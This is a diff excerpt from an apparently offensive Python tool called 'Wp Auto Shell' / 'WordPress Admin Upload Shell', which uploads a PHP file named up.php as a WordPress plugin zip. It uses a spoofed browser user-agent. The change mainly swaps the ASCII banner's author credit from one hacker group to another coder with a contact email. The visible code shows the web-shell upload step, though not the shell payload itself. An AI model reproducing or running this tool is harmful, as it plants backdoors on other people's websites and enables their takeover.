@@ -39,17 +39,12 @@ files = {'pluginzip': ('up.php', uploader.encode('utf-8'))}
 headers = {'user-agent': 'Moozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
 system("clear")
 green = "\033[0;32m"
-auth = """  ____  _            _      _____  _     _     _     
- |  _ \| |          | |    |  __ \| |   (_)   | |    
- | |_) | | __ _  ___| | __ | |__) | |__  _ ___| |__  
- |  _ <| |/ _` |/ __| |/ / |  ___/| '_ \| / __| '_ \ 
- | |_) | | (_| | (__|   <  | |    | | | | \__ \ | | |
- |____/|_|\__,_|\___|_|\_\ |_|    |_| |_|_|___/_| |_|
-                       ______                        
-                      |______|                      
-        
-    Name : Wp Auto Shell (Single)
-    Team : Muslim Cyber Army-BD
+auth = """     
+ _____________________________________________
+ |        WORDPRESS ADMIN UPLOAD SHELL        | 
+ |[+]Coded By : AzuraX-Thopik                 |
+ |[+]Contact  : azurax22@gmail.com            |
+ |____________________________________________|
                         """
 print(la7mar+" Hello! Ripon. Welcome To")
 sleep(2)
